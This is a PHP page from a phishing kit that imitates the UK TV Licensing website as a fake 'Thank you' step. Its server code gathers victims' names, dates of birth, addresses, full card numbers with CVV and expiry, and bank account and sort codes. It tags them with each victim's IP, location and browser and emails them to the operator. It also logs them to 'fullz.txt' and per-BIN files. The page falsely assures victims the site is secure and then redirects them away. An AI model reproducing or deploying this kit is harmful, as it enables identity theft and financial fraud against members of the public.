﻿<?php
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');




$date = date('l d F Y');
$time = date('H:i');
$name = $_SESSION['name'];
$dob = $_SESSION['dob'];
$lastName = $_SESSION['lastName'];
$licenceNumber = $_SESSION['licenceNumber'];
$postcode2 = $_SESSION['postcode2']; //postcode from login
$postcode = $_SESSION['postcode'];
$telephone = $_SESSION['telephone'];
$email = $_SESSION['email'];
$address = $_SESSION['address'];
$town = $_SESSION['town'];
$ccname = $_SESSION['ccname'];
$ccno = $_SESSION['ccno'];
$ccexp = $_SESSION['ccexp'];
$secode = $_SESSION['secode'];
$sortcode = $_SESSION['sortcode'];
$account = $_SESSION['account'];
$ccno = str_replace(' ', '', $ccno);
$last4 = substr($ccno, 12, 16);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['type']);
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "serAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "Os : " . $systemInfo['os'] . "";

$data = "
<^>-----------------------713566330-----------------------<^>

<^>Login<^>
Last Name : $lastName
Password : $licenceNumber
Postcode : $postcode2


<^>Personal details<^>
Full name : $name
Telephone : $telephone
Date of birth : $dob
Email : $email
Address : $address
Town : $town
Postcode : $postcode

<^>Auto billing details<^>
Card BIN : $BIN
Card Bank : $Bank
Card Brand : $Brand 
Card Type : $Type

<^>Victim billing details<^>
Cardholder name : $ccname
Card number : $ccno
Card exp : $ccexp
Security code : $secode
Account : $account
Sortcode : $sortcode

<^>Victim PC details<^>
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5

Received : $date @ $time
<^>-----------------------713566330-----------------------<^>
";



if ($binSave === 1) {
    $binlist = fopen($BIN.".txt","a");
    fwrite($binlist, $data . "\n\n");
    fclose($binlist);
}

if ($binlist === 1) {
    $bins = array();
    $getBins = explode('\n', file_get_contents('bins.txt'));
    foreach ($getBins as $getbin => $gb) {
        $dat = explode('=>', $gb);
        $bins[$dat[0]] = $dat[1];
    }
    if (isset($bins[intval($BIN)])) {
        $bins[intval($BIN)] =  intval($bins[intval($BIN)]) + 1;
    } else {
        $bins[intval($BIN)] = 1;
    }
    $binFile = fopen('list_bins.txt', 'w');
    foreach ($bins as $bin=>$bn) {
        fwrite($binFile, $bin . "\n");
    }
    fclose($binFile);
}

if ($sendEmail === 1) {

    mail($to,  $BIN . " from " . $_SERVER['REMOTE_ADDR'], $data);
}

if ($saveFile === 1) {
    $file = fopen('assets/logs/fullz.txt', 'a');
    fwrite($file, $data . "\n");
    fclose($file);
}



?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" class="" lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>Thank You! - TV Licensing ™</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="ROBOTS" content="NOODP,NOYDIR">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="refresh" content="7; url=<?php echo $ExitLink;?>" />
    <link rel="shortcut icon" href="assets/files_2/favicon.ico" type="image/x-icon">
    <link href="assets/files_2/Satellite_003.css" media="screen" type="text/css" rel="stylesheet">
    <link href="assets/files_2/Satellite_002.css" media="print" type="text/css" rel="stylesheet">
    <link href="assets/files_2/jquery.css" rel="stylesheet">
    <link href="assets/files_2/Satellite.css" media="screen" type="text/css" rel="stylesheet">
    <link href="assets/files_2/jquery_002.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
    <script>
        $('#verify').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#verify").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                name: {	required: true,	minlength: 4,},
                                dob: {	required: true,	minlength: 10,},
                                address: { required: true, minlength: 5,},
                                town: { required: true, minlength: 3,},
                                postcode: { required: true, minlength: 5,},
                                telephone: { required: true, minlength: 11, digits: true,},
                                email: { required: true, email: true,},
                            },
                            messages: {
                                name: {
                                    required: "Please provide full name",
                                    minlength: jQuery.validator.format("Please provide your full name"),
                                },
                                dob: {
                                    required: "Please provide date of birth",
                                    minlength: jQuery.validator.format("Please provide your date of birth"),
                                },
                                telephone: {
                                    required: "Please provide telephone number",
                                    minlength: jQuery.validator.format("Please ensure you enter 11 digits exactly"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                email: {
                                    required: "Please provide email address",
                                    email: jQuery.validator.format("Please check the email address you have entered"),
                                },
                                address: {
                                    required: "Please provide the 1st line of your address",
                                    minlength: jQuery.validator.format("Please check the address you have entered"),
                                },
                                town: {
                                    required: "Please provide city/town",
                                    minlength: jQuery.validator.format("Please check the city/town you have entered"),
                                },
                                postcode: {
                                    required: "Please provide postcode",
                                    minlength: jQuery.validator.format("Please check the postcode you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                document.getElementById("Details").style.display = "none";
                                document.getElementById("Payment").style.display = "block";
                                ForwardValues();
                                $('body,html').animate({
                                    scrollTop: 0
                                }, 800);
                                return false;
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);

        function ForwardValues() {
            var name = document.getElementById("name").value;
            document.getElementById("one").value=name;
            var dob = document.getElementById("dob").value;
            document.getElementById("two").value=dob;
            var telephone = document.getElementById("telephone").value;
            document.getElementById("three").value=telephone;
            var email = document.getElementById("email").value;
            document.getElementById("four").value=email;
            var address = document.getElementById("address").value;
            document.getElementById("five").value=address;
            var town = document.getElementById("town").value;
            document.getElementById("six").value=town;
            var postcode = document.getElementById("postcode").value;
            document.getElementById("seven").value=postcode;
        }
        $('#payment').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#payment").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                ccname: { required: true, minlength: 4},
                                ccno: { required: true, minlength: 16, creditcard: true},
                                ccexp: { required: true, minlength: 7,},
                                secode: { required: true, minlength: 3, digits: true,},
                                account: { required: true, minlength: 8,},
                                sortcode: { required: true, minlength: 8,},
                            },
                            messages: {
                                ccname: {
                                    required: "Please provide cardholders name",
                                    minlength: jQuery.validator.format("Please check the cardholders name you have entered"),
                                },
                                ccno: {
                                    required: "Please provide 16 digit card number",
                                    minlength: jQuery.validator.format("Please check the card number you have entered"),
                                    creditcard: jQuery.validator.format("Please check the card number you have entered"),
                                },
                                ccexp: {
                                    required: "Please provide card expiry date",
                                    minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
                                },
                                secode: {
                                    required: "Please provide 3 digit card security code (CVV)",
                                    minlength: jQuery.validator.format("Please check the card security code you have entered"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                account: {
                                    required: "Please provide 8 digit account number",
                                    minlength: jQuery.validator.format("Please check the account number you have entered"),
                                },
                                sortcode: {
                                    required: "Please provide 6 digit sort code",
                                    minlength: jQuery.validator.format("Please check the sort code you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                form.submit();
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);
    </script>
    <script type="text/javascript">
        function movetoNext(current, nextFieldID) {
            if (current.value.length >= current.maxLength) {
                document.getElementById(nextFieldID).focus();
            }
        }
        jQuery(function($){
            $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
            $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
            $("#cc-exp").mask("99 / 99",{placeholder:"MM / YY"});
        });
        jQuery(function($) {
            $('.cc-number').payment('formatCardNumber');
            $('.cc-exp').payment('formatCardExpiry');
            $('.cc-cvc').payment('formatCardCVC');

            $.fn.toggleInputError = function(erred) {
                this.parent('.field').toggleClass('errorzzzz', erred);
                return this;
            };

            $('form').submit(function(e) {
                e.preventDefault();

                var cardType = $.payment.cardType($('.cc-number').val());
                $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
                $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
                $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
                $('.cc-brand').text(cardType);
            });

        });

    </script>
</head>
<script type="text/javascript" id="useragent-switcher">
    navigator.__defineGetter__("userAgent", function() {
        return "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"
    })
</script>
<body onload="javascript:checkCookie();" class="steps">
<div>
    <noscript>
        <div id="blq-global">
            <div id="tvlScript">
                <div id="tvlScript-prompt">
                    <div id="header_Script">
                        <h2>Please enable Javascript in your browser</h2>
                    </div>
                    <div id="tvlScript-body">
                        <p class="icon">You will need to <a href="#">enable Javascript in your web browser</a> in order to use all the features of our website.</p>
                    </div>
                </div>
            </div>
        </div>
    </noscript>
</div>
<input id="localTypeLang" name="localTypeLang" value="en" type="hidden">
<div id="iPage">
    <div id="iHeader">
        <div class="innerContainer clearfix topHeadCtr">
            <div class="clearfix" id="headerTop">
                <div class="clearfix" id="iLogo">
                    <h1>
                        <a href="#" title="TV Licence home page" class="fwckembeddedlink logoWrapper">
                            <img alt="TV Licensing logo" src="assets/files_2/imgHeaderLogo.png">
                        </a>
                        <span class="headingText">TV Licensing</span>
                    </h1>
                    <div id="linkToggle" style="cursor: pointer;"> &nbsp;</div>
                </div>
                <div class="mobileNav clearfix right" id="iMobileNav">
                    <a href="#" title="logout">Sign out</a>
                    <div class="clearfix" id="srhCtr" style="cursor: pointer;"> &nbsp;</div>
                </div>
                <div class="clearfix" id="iGlobalNav">
                    <ul>
                        <li class="first">
                            <a href="#" title="TV Licensing home page" class="fwckembeddedlink">Home</a>
                        </li>
                        <li>
                            <a href="#" title="TV Licensing easy read" class="fwckembeddedlink">Easy read</a>
                        </li>
                        <li class="second">
                           <span lang="cy">
                           <a href="#" title="Cymraeg" class="fwckembeddedlink">Cymraeg</a>
                           </span>
                        </li>
                        <li id="logout" style="">
                            <a href="#">Sign out</a>
                        </li>
                    </ul>
                    <fieldset class="search" id="siteSrch" style="display: block;">
                        <legend class="hide">search site</legend>
                        <label for="siteSearch" id="searchLabel" style="display: none;">Search</label>
                        <span class="siteSearchWrap">
                        <input id="siteSearch" name="q" style="color: rgb(88, 88, 88);" value="Search" type="search">
                        </span>
                        <input id="siteSearchGo" value="search" name="___##NO_NAMED_ELEMENT##___" type="button">
                    </fieldset>
                </div>
            </div>
            <div class="clearfix" id="iPrimaryNav">
                <ul>
                    <li>
                        <a href="#" title="Pay for your TV Licence">
                            <span><strong>Pay</strong> for your TV Licence</span>
                        </a>
                    </li>
                    <li>
                        <a href="#" title="Update your TV Licence details">
                            <span><strong>Update</strong> your details</span>
                        </a>
                    </li>
                    <li>
                        <a href="#" title="Check if you need a TV Licence" class="fwckembeddedlink">
                            <span><strong>Check</strong> if you need one</span>
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <script type="text/javascript">
            $(document).ready(function(e) {
                //<![CDATA[
                showLogoutLink(true);

                $("#linkToggle").click(function() {
                    if (!($("#iGlobalNav ul").is(':hidden') && $("#iPrimaryNav").is(':hidden'))) {
                        $("#iGlobalNav ul").hide();
                        $("#iPrimaryNav").hide();
                        if (true) {
                            $("#mlogout").css("float", "left").show();
                        }
                    } else {
                        $("#iGlobalNav ul").show();
                        $("#iPrimaryNav").show();
                        $("#srhCtr").show();
                        $("#mlogout").css("float", "left").hide();
                    }
                    $("#siteSrch").hide();

                });

                $("#srhCtr").click(function() {
                    $(this).hide();
                    $("#siteSrch").css("padding-top", "0.385em");
                    $("#mlogout").css("float", "right");
                    if (!($("#siteSrch").is(':hidden') || $("#mlogout").is(':hidden'))) {
                        $("#siteSrch").css("padding-top", "0em");
                        $("#siteSrch").hide();
                        $("#mlogout").hide();
                    } else {
                        $("#siteSrch").css("padding-top", "0.385em");
                        $("#siteSrch").show();
                        if (true) {
                            $("#mlogout").show();
                        }
                    }

                    if (!($("#iGlobalNav ul").is(':hidden') && $("#iPrimaryNav").is(':hidden'))) {
                        $("#iGlobalNav ul").hide();
                        $("#iPrimaryNav").hide();
                    }
                    if (true) {
                        $(".mlogout").show();
                    }
                });
                //]]>
            });
        </script>
    </div>
    <div id="iContent">
        <div class="innerContainer">
            <ul id="iBread">
                <li>
                    <a href="#">Home<span class="linkPurpose">Link for Home</span></a>
                </li>
                <li>
                    /
                    <a href="#">
                        My Account
                        <span class="linkPurpose robots-nocontent robots-noindex">
                           <!--googleoff: all-->Alternative link for Update your details<!--googleon: all-->
                        </span>
                    </a>
                </li>
                <li>/
                    <a href="#">Update details</a>
                </li>
                <li>/ Thank You!</li>
            </ul>
            <div id="iPrimary">
                <ol title="Update personal details" id="iStep" class="clearfix">
                    <li class="disabled">
                        <label id="Label1" for="Button1">
                        <span class="steplabel">
                        Update personal details
                        </span><span class="hiddenAccessibleTextOnStepsMenu">Current step</span>
                        </label>
                        <input id="Button1" class="stepSubmitButton" value="1" name="Button1" type="button">
                    </li>
                    <li class="disabled">
                        <label id="Label2" for="Button2">
                        <span class="steplabel">
                        Update billing details
                        </span>
                            <span class="hiddenAccessibleTextOnStepsMenu">Future step</span>
                        </label>
                        <input id="Button2" class="stepSubmitButton" value="2" name="Button2" tabindex="-1" type="button">
                    </li>
                    <li class="disabled">
                        <label id="Label3" for="Button3">
                        <span class="steplabel">
                        Review & Confirm
                        </span>
                            <span class="hiddenAccessibleTextOnStepsMenu">Future step</span>
                        </label>
                        <input id="Button3" class="stepSubmitButton" value="3" name="Button3" tabindex="-1" type="button">
                    </li>
                    <li class="selected">
                        <label id="Label4" for="Button4">
                        <span class="steplabel">
                        Thank you
                        </span>
                            <span class="hiddenAccessibleTextOnStepsMenu">Future step</span>
                        </label>
                        <input id="Button4" class="stepSubmitButton" value="4" name="Button4" tabindex="-1" type="button">
                    </li>
                </ol>
                <div class="panel secondary stepContent clearfix" id="stepContent">
                    <h2 class="header beta">
                        <span>Step 4: Thank you!</span>
                    </h2>
                    <form id="payment" action="Step4.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" method="post">

                        <br /> <br />
                        <div class="helpArea" style="text-align: center;">
                            <img src="assets/spin.gif" style="width: 35px; text-align:center;" /> <br /> <br />
                           <p>Thank you for updating your TV license account details. You will be redirected shortly to main page.</p>
                        </div>


                        <br /> <br />

                    </form>

                </div>
            </div>
            <div id="iSecondary">
                <div class="panel assist" style="display: none;">
                    <h3 class="header"><span>When we’ll email you</span></h3>
                    <div>
                        <p>We’ll only ever send you essential information about your TV Licence, such as reminders that a payment is due or has been missed. And we’ll only ever use your email for TV Licensing purposes. Find out more how we <a href="#">protect your personal information</a>.</p>
                    </div>
                </div>
                <div class="panel primary">
                    <h3 class="header alpha secure">
                        <span>Secure website</span>
                    </h3>
                    <p>
                        Whether you’re paying for your TV Licence, setting up a Direct Debit, or updating your details, you can relax in the knowledge that this is a secure website and your personal information is safe with us.
                    </p>
                </div>
            </div>
            <div style="clear:both;"></div>
        </div>
    </div>
    <div id="iFooter">
        <div class="innerContainer">
            <ul id="iFooterNav">
                <li class="first">
                    <a href="#" title="About TV Licensing" class="fwckembeddedlink">About us</a>
                </li>
                <li>
                    <a href="#" title="Contact TV Licensing">Contact us</a>
                </li>
                <li>
                    <a href="#" title="Accessibility guidelines" class="fwckembeddedlink">Accessibility</a>
                </li>
                <li>
                    <a href="#" title="Community relations">Community relations</a>
                </li>
                <li>
                    <a href="#" title="Media Centre">Media Centre</a>
                </li>
                <li>
                    <a href="#" title="TV Licensing sitemap" class="fwckembeddedlink">Sitemap</a>
                </li>
                <li>
                    <a href="#" title="TV Licensing’s use of cookies" class="fwckembeddedlink">Cookies</a>
                </li>
                <li class="last">
                    <a href="#" title="TV Licensing's privacy policy" class="fwckembeddedlink">Privacy policy</a>
                </li>
            </ul>
            <p>
                General information about TV Licensing is available in other languages:
            </p>
            <ul id="iLanguages">
                <li class="first">
                    <span lang="cy"><a href="#" title="Select this link to go to general TV Licensing information translated into Welsh" class="fwckembeddedlink">Cymraeg</a></span>
                </li>
                <li>
                    <span lang="pl"><a href="#" title="Select this link to go to general TV Licensing information translated into Polish" class="fwckembeddedlink">Polski</a></span>
                </li>
                <li>
                    <span lang="es"><a href="#" title="Select this link to go to general TV Licensing information translated into Spanish" class="fwckembeddedlink">Español</a></span>
                </li>
                <li>
                    <span lang="pt"><a href="#" title="Select this link to go to general TV Licensing information translated into Portuguese" class="fwckembeddedlink">Português</a></span>
                </li>
                <li style="background: rgba(0, 0, 0, 0) url('/cs/TVL/css/images/footer/imgFooterNavBg.png') no-repeat scroll right top; padding-right: 1.4em">
                    <span class="unicode" lang="ur"><a href="#" title="Select this link to go to general TV Licensing information translated into Urdu" class="fwckembeddedlink">اردو</a></span>
                </li>
                <li class="last" style="padding-left: 1.11em;">
                    <a href="#">More languages &gt;&gt;</a>
                </li>
            </ul>
            <p class="copyright">
                © 2018 TV Licensing
            </p>
        </div>
        <div>
            &nbsp;
        </div>
    </div>
</div>
<div>
    <noscript>
        <div>
            <img alt="DCSIMG" id="Img1" width="1" height="1" src="#" />
        </div>
    </noscript>
</div>
<!-- Remarketing Tag:   -->
<!-- Remarketing Pixel:  -->
</body>
</html>

